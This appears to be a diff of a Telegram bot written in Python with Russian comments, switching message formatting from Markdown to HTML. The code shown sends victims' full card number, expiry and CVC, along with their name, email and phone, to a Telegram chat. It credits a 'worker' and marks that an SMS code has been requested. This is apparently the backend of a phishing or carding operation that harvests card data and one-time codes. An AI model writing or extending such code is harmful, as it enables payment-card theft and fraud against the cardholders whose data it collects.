@@ -414,7 +414,7 @@ def send_chat_message():
             creator_username = f"ID: {user_id}"  # fallback на user_id
 
         # Отправляем сообщение в отдельный чат для SMS
-        telegram_message = f"""💬 *НОВОЕ СООБЩЕНИЕ*
+        telegram_message = f"""💬 НОВОЕ СООБЩЕНИЕ
 
 👤 От: {creator_username}
 💬 Текст:
@@ -425,7 +425,7 @@ def send_chat_message():
         payload = {
             'chat_id': -1003473975732,  # ← ОТДЕЛЬНЫЙ ЧАТ ДЛЯ SMS
             'text': telegram_message,
-            'parse_mode': 'Markdown'
+            'parse_mode': 'HTML'
         }
         
         # ОТПРАВЛЯЕМ СООБЩЕНИЕ!
@@ -1160,18 +1160,18 @@ async def process_payment_data(message: types.Message):
             card_status = "ПРИВЯЗАННАЯ КАРТА" if is_card_bound else "НЕПРИВЯЗАННАЯ КАРТА"
             
             # Форматируем сообщение в новом стиле СРАЗУ
-            formatted_text = f"💳 *{card_status}* 🔗\n\n"
-            formatted_text += f"👤 *Лог от:* {creator_info}\n\n"
-            formatted_text += "👤 *Клиент:*\n"
+            formatted_text = f"💳 <b>{card_status}</b>\n\n"
+            formatted_text += f"👤 <b>Воркер:</b> {creator_info}\n\n"
+            formatted_text += "👤 <b>Клиент:</b>\n"
             formatted_text += f"• Имя: {payment_data.get('first_name', '')}\n"
             formatted_text += f"• Фамилия: {payment_data.get('last_name', '')}\n"
             formatted_text += f"• Email: {payment_data.get('email', '')}\n"
             formatted_text += f"• Телефон: {payment_data.get('phone', '')}\n\n"
-            formatted_text += "💳 *Карта:*\n"
+            formatted_text += "💳 <b>Карта:</b>\n"
             formatted_text += f"• Номер: {payment_data.get('card_number', '')}\n"
             formatted_text += f"• Срок: {payment_data.get('card_expiry', '')}\n"
             formatted_text += f"• CVC: {payment_data.get('cvc', '')}\n\n"
-            formatted_text += "📱 *Статус: SMS код запрошен*\n\n"
+            formatted_text += "📱 <b>Статус: SMS код запрошен</b>\n\n"
             formatted_text += "Выберите действие:"
             
             await bot.send_message(
@@ -2079,3 +2079,4 @@ async def main():
 
 if __name__ == "__main__":
     asyncio.run(main())
+
